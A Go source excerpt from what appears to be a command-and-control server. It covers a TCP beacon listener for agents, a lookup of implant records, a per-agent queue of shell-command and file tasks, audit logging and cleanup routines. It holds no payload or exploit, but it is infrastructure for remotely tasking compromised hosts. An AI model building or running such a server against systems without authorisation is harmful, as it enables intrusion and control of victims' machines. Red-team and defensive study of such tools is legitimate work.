func (s *Server) stopExtraListener(key string) error {
	s.extraListenersMu.Lock()
	closer, ok := s.extraListeners[key]
	delete(s.extraListeners, key)
	s.extraListenersMu.Unlock()
	if !ok {
		return nil
	}
	return closer.Close()
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(PeriodicCleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupOldData()
		}
	}
}

func (s *Server) periodicRPortFwdCleanup() {
	ticker := time.NewTicker(RPortFwdCleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupStaleRPortFwd()
		}
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}

// isPortAvailable checks whether the given host:port can be listened on.
func isPortAvailable(host string, port int) bool {
	addr := host + ":" + itoa(port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return false
	}
	ln.Close()
	return true
}

// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	s.tcpLn = ln
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	s.wg.Add(1)
	defer s.wg.Done()
	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				slog.Error("TCP accept error", "addr", s.cfg.Server.TCPAddr, "err", err)
				continue
			}
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		conn.SetReadDeadline(time.Now().Add(TCPReadDeadline))

		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > 16*1024*1024 {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req, "")

		respBytes, _ := json.Marshal(resp)
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
func (s *Server) ActivityMiddleware() gin.HandlerFunc {
	var mu sync.Mutex
	lastUpdated := make(map[uint]time.Time)
	return func(c *gin.Context) {
		userID, exists := c.Get("user_id")
		if !exists {
			c.Next()
			return
		}
		uid, ok := userID.(uint)
		if !ok {
			c.Next()
			return
		}
		now := time.Now()
		mu.Lock()
		last := lastUpdated[uid]
		if now.Sub(last) < ActivityUpdateThrottle {
			mu.Unlock()
			c.Next()
			return
		}
		lastUpdated[uid] = now
		mu.Unlock()
		go s.db.Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
		c.Next()
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		respondError(c, http.StatusNotFound, "agent not found")
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	// Per-agent task queue depth limit — prevents a single compromised agent from flooding the queue
	s.agentPendingTasksMu.Lock()
	pending := s.agentPendingTasks[agentID]
	if pending >= MaxPendingTasksPerAgent {
		s.agentPendingTasksMu.Unlock()
		return nil, fmt.Errorf("agent %s has %d pending tasks (limit %d)", agentID, pending, MaxPendingTasksPerAgent)
	}
	s.agentPendingTasks[agentID] = pending + 1
	s.agentPendingTasksMu.Unlock()

	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		s.agentPendingTasksMu.Lock()
		s.agentPendingTasks[agentID]--
		s.agentPendingTasksMu.Unlock()
		return nil, err
	}
	if s.pluginManager != nil {
		go s.pluginManager.ExecuteHook(context.Background(), plugin.Event{
			Type:      plugin.EventTaskCreated,
			Timestamp: time.Now(),
			AgentID:   agentID,
			Payload: map[string]interface{}{
				"task_id":   task.ID,
				"task_type": taskType,
				"command":   command,
			},
		})
	}
	s.metrics.TasksTotal.Inc()
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
// Sets CreatedBy from the authenticated user in context.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	// Set task attribution from context
	user, _ := c.Get("user")
	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
		task.CreatedBy = username
		s.db.Model(task).Update("created_by", username)
	}
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleHealthCheck provides health/ready endpoints for monitoring
func (s *Server) handleHealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":  "ok",
		"version": ServerVersion,
		"uptime":  time.Since(s.startTime).String(),
	})
}

